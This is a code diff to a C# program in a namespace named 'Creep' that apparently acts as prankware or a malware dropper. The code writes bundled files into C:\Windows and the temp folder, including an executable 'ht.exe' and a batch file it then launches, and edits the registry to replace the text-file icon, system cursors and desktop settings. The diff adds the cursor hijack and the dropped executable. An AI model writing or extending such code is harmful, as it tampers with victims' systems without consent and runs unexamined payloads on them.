@@ -49,11 +49,17 @@ namespace Creep
         {
             string temp = System.IO.Path.GetTempPath();
             System.IO.File.WriteAllBytes(@"C:\Windows\" + "icon.ico", Properties.Resources.texticon);
+            System.IO.File.WriteAllBytes(@"C:\Windows\" + "cursor_ht.cur", Properties.Resources.cs);
 
             RegistryKey editKey;
             
             editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
             editKey.SetValue("", @"C:\Windows\" + "icon.ico");
+            editKey.Close();
+            editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+            editKey.SetValue("Arrow", @"C:\Windows\" + "cursor_ht.cur");
+            editKey.SetValue("Hand", @"C:\Windows\" + "cursor_ht.cur");
+            editKey.SetValue("Wait", @"C:\Windows\" + "cursor_ht.cur");
             editKey.Close();
 
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
@@ -71,6 +77,7 @@ namespace Creep
             System.IO.File.WriteAllBytes(temp + "text.txt", Properties.Resources.txt);
             System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);
             System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
+            System.IO.File.WriteAllBytes(temp + "ht.exe", Properties.Resources.subox);
             System.IO.File.WriteAllBytes(@"C:\Windows\" + "ht.jpg", Properties.Resources.ht);
 
             ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
